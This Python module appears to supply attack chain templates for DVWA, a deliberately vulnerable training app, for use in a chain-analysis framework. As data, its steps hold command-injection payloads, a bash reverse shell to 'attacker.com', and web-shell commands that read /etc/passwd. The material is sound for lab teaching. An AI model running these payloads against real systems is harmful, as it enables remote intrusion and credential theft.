#!/usr/bin/env python3
"""
DVWA (Damn Vulnerable Web Application) - Attack Chain Templates
Author: Victor Ibhafidon

Pre-built attack chain templates for DVWA.
DVWA is a classic vulnerable web application for learning web security.

HOW IT CONNECTS TO THE FRAMEWORK:
- Uses chain_analyzer.py to create AttackChain objects
- Templates provide starting points for DVWA-specific chains
- Integrates with visualizer.py for diagram generation

USAGE:
 from chains.chain_templates.dvwa_templates import get_dvwa_templates
 
 templates = get_dvwa_templates()
 for analyzer, chain in templates:
 # Customize with your findings
 print(chain.title)
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from chain_analyzer import (
 ChainAnalyzer, ChainStep, VulnerabilityType, ImpactLevel
)

def create_command_injection_chain():
 """
 Template: Command Injection to Remote Code Execution
 
 DVWA's command injection vulnerability leads to RCE on the server.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="DVWA - Command Injection to Remote Code Execution",
 description="Command injection in ping functionality leads to remote code execution",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = [
 "Access to Command Injection module",
 "Security level set to Low/Medium"
 ]
 chain.context = "DVWA Command Injection vulnerability"
 chain.tags = {"command-injection", "rce", "dvwa", "web"}
 chain.severity = "Critical"
 
 # Step 1: Command Injection Discovery
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.RCE,
 description="Command injection in ping field",
 endpoint="/vulnerabilities/exec/",
 payload="127.0.0.1; whoami",
 outcome="Command injection confirmed"
 )
 
 # Step 2: System Information Gathering
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.RCE,
 description="Gather system information (OS, users, network)",
 endpoint="/vulnerabilities/exec/",
 prerequisites=["Command injection confirmed"],
 payload="127.0.0.1; uname -a; id; ifconfig",
 outcome="System information gathered"
 )
 
 # Step 3: Reverse Shell
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.RCE,
 description="Establish reverse shell for persistent access",
 endpoint="/vulnerabilities/exec/",
 prerequisites=["System information gathered"],
 payload="127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
 outcome="Remote code execution achieved"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def create_file_upload_chain():
 """
 Template: File Upload to Remote Code Execution
 
 Unrestricted file upload leads to web shell and RCE.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="DVWA - File Upload to Remote Code Execution",
 description="Unrestricted file upload allows web shell upload and remote code execution",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = [
 "Access to File Upload module",
 "Security level set to Low"
 ]
 chain.context = "DVWA File Upload vulnerability"
 chain.tags = {"file-upload", "rce", "web-shell", "dvwa"}
 chain.severity = "Critical"
 
 # Step 1: Web Shell Upload
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.OTHER,
 description="Upload PHP web shell bypassing file type restrictions",
 endpoint="/vulnerabilities/upload/",
 payload="shell.php (with .php extension or double extension)",
 outcome="Web shell uploaded successfully"
 )
 
 # Step 2: Web Shell Access
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.RCE,
 description="Access uploaded web shell via browser",
 endpoint="/hackable/uploads/shell.php",
 prerequisites=["Web shell uploaded successfully"],
 payload="?cmd=whoami",
 outcome="Web shell accessible"
 )
 
 # Step 3: Remote Code Execution
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.RCE,
 description="Execute arbitrary commands via web shell",
 endpoint="/hackable/uploads/shell.php",
 prerequisites=["Web shell accessible"],
 payload="?cmd=cat /etc/passwd",
 outcome="Remote code execution achieved"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def get_dvwa_templates():
 """Get all DVWA attack chain templates."""
 templates = []
 
 analyzer1, chain1 = create_command_injection_chain()
 templates.append((analyzer1, chain1))
 
 analyzer2, chain2 = create_file_upload_chain()
 templates.append((analyzer2, chain2))
 
 return templates

if __name__ == "__main__":
 print("=" * 80)
 print("DVWA - ATTACK CHAIN TEMPLATES")
 print("=" * 80)
 
 templates = get_dvwa_templates()
 for analyzer, chain in templates:
 print(f"\n {chain.title}")
 print(f" Steps: {len(chain.steps)}")
 is_valid, _ = chain.validate_chain()
 print(f" Status: {' Valid' if is_valid else ' Issues'}")
 
 print(f"\n Total: {len(templates)} templates")

